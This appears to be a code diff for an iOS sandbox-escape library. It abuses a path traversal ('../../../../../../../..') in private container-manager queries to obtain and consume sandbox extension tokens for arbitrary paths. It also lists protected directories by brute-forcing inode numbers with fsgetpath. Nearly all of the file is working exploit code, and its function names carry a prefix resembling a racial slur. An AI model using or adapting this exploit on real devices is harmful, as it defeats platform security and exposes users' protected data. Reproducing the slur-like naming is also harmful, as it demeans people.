@@ -17,15 +17,23 @@ typedef void (*query_set_part_fn)(void *, uint64_t);
 typedef void (*query_set_domain_fn)(void *, const char *);
 typedef void *(*query_single_fn)(void *);
 typedef void (*query_free_fn)(void *);
+typedef const char *(*object_get_path_fn)(void *);
 typedef char *(*copy_token_fn)(void *);
 typedef int64_t (*consume_fn)(const char *);
 typedef int (*release_fn)(int64_t);
 
+static void *open_container_manager(void) {
+    return dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+}
+
 int64_t niga_escape_path(const char *path, bool create) {
     if (!path || path[0] != '/') return -255;
-    if (!create) { struct stat st; if (lstat(path, &st) != 0) return -254; }
+    if (!create) {
+        struct stat st;
+        if (lstat(path, &st) != 0) return -254;
+    }
 
-    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+    void *mgr = open_container_manager();
     if (!mgr) return -1;
 
     query_create_fn qcreate = (query_create_fn)dlsym(mgr, "container_query_create");
@@ -38,10 +46,23 @@ int64_t niga_escape_path(const char *path, bool create) {
     query_free_fn qfree = (query_free_fn)dlsym(mgr, "container_query_free");
     copy_token_fn copytoken = (copy_token_fn)dlsym(mgr, "container_copy_sandbox_token");
     consume_fn consume = (consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
-    if (!qcreate || !qclass || !qids || !qflags || !qpart || !qdomain || !qsingle || !qfree || !copytoken || !consume) { dlclose(mgr); return -1; }
+
+    if (!qcreate || !qclass || !qids || !qflags || !qpart || !qdomain ||
+        !qsingle || !qfree || !copytoken || !consume) {
+        dlclose(mgr);
+        return -1;
+    }
 
     void *query = qcreate();
-    if (!query) { dlclose(mgr); return -2; }
+    if (!query) {
+        dlclose(mgr);
+        return -2;
+    }
+
+    // bad_query's iOS 27 route: start in MobileGestalt's Shared/SystemGroup
+    // container and ask containermanagerd_system for a scoped extension after
+    // path traversal. This does NOT imply every /var path is reachable; iOS 27
+    // exposes specific MCM-backed roots such as Data/System and SystemGroup.
     xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
     qclass(query, 13);
     qids(query, identifier);
@@ -49,17 +70,93 @@ int64_t niga_escape_path(const char *path, bool create) {
 
     char *domain = NULL;
     if (asprintf(&domain, "../../../../../../../..%s", path) == -1) {
-        xpc_release(identifier); qfree(query); dlclose(mgr); return -5;
+        xpc_release(identifier);
+        qfree(query);
+        dlclose(mgr);
+        return -5;
     }
     qdomain(query, domain);
     qflags(query, 0x0000008000000000ULL);
+
     void *result = qsingle(query);
-    if (!result) { free(domain); xpc_release(identifier); qfree(query); dlclose(mgr); return -3; }
+    if (!result) {
+        free(domain);
+        xpc_release(identifier);
+        qfree(query);
+        dlclose(mgr);
+        return -3;
+    }
+
     char *token = copytoken(result);
-    if (!token) { free(domain); xpc_release(identifier); qfree(query); dlclose(mgr); return -4; }
+    if (!token) {
+        free(domain);
+        xpc_release(identifier);
+        qfree(query);
+        dlclose(mgr);
+        return -4;
+    }
+
     int64_t handle = consume(token);
-    free(token); free(domain); xpc_release(identifier); qfree(query); dlclose(mgr);
+    free(token);
+    free(domain);
+    xpc_release(identifier);
+    qfree(query);
+    dlclose(mgr);
     return handle;
+}
+
+char *niga_mcm_container_path(uint64_t container_class,
+                              const char *identifier,
+                              bool group_identifier) {
+    if (!identifier || identifier[0] == '\0') return NULL;
+
+    void *mgr = open_container_manager();
+    if (!mgr) return NULL;
+
+    query_create_fn qcreate = (query_create_fn)dlsym(mgr, "container_query_create");
+    query_set_class_fn qclass = (query_set_class_fn)dlsym(mgr, "container_query_set_class");
+    query_set_ids_fn qidentifiers = (query_set_ids_fn)dlsym(mgr, "container_query_set_identifiers");
+    query_set_ids_fn qgroupidentifiers = (query_set_ids_fn)dlsym(mgr, "container_query_set_group_identifiers");
+    query_set_flags_fn qflags = (query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
+    query_set_part_fn qpart = (query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
+    query_single_fn qsingle = (query_single_fn)dlsym(mgr, "container_query_get_single_result");
+    query_free_fn qfree = (query_free_fn)dlsym(mgr, "container_query_free");
+    object_get_path_fn getpath = (object_get_path_fn)dlsym(mgr, "container_object_get_path");
+
+    if (!qcreate || !qclass || !qidentifiers || !qgroupidentifiers ||
+        !qflags || !qsingle || !qfree || !getpath) {
+        dlclose(mgr);
+        return NULL;
+    }
+
+    void *query = qcreate();
+    if (!query) {
+        dlclose(mgr);
+        return NULL;
+    }
+
+    qclass(query, container_class);
+    xpc_object_t value = xpc_string_create(identifier);
+    if (group_identifier) qgroupidentifiers(query, value);
+    else qidentifiers(query, value);
+
+    // Metadata-only/no-create lookup. We only need the real UUID-backed root;
+    // niga_escape_path() is then used separately to obtain actual filesystem
+    // authority for paths that bad_query exposes on this beta.
+    qflags(query, 0x0000000100000000ULL);
+    if (qpart) qpart(query, 0);
+
+    void *result = qsingle(query);
+    char *out = NULL;
+    if (result) {
+        const char *raw = getpath(result);
+        if (raw && raw[0] == '/') out = strdup(raw);
+    }
+
+    xpc_release(value);
+    qfree(query);
+    dlclose(mgr);
+    return out;
 }
 
 void niga_release_path(int64_t handle) {
@@ -73,20 +170,36 @@ char *niga_list_children(const char *path, int64_t max_inode) {
     struct statfs sfs;
     if (statfs(path, &sfs) != 0) return NULL;
     fsid_t fsid = sfs.f_fsid;
-    size_t cap = 65536, length = 0, plen = strlen(path);
-    char *out = malloc(cap); if (!out) return NULL; out[0] = '\0';
+
+    size_t cap = 65536;
+    size_t length = 0;
+    size_t plen = strlen(path);
+    char *out = malloc(cap);
+    if (!out) return NULL;
+    out[0] = '\0';
+
     char buf[1200];
     for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
-        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino); if (n <= 0) continue;
+        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
+        if (n <= 0) continue;
+
         const char *p = buf;
         if (strncmp(p, "/private/var/", 13) == 0) p += 8;
         if (strncmp(p, path, plen) != 0 || p[plen] != '/') continue;
         if (strchr(p + plen + 1, '/')) continue;
+
         size_t need = strlen(p) + 2;
-        if (length + need > cap) { cap *= 2; char *tmp = realloc(out, cap); if (!tmp) break; out = tmp; }
+        if (length + need > cap) {
+            cap *= 2;
+            char *tmp = realloc(out, cap);
+            if (!tmp) break;
+            out = tmp;
+        }
         length += snprintf(out + length, cap - length, "%s\n", p);
     }
     return out;
 }
 
-void niga_free_string(char *value) { if (value) free(value); }
+void niga_free_string(char *value) {
+    if (value) free(value);
+}
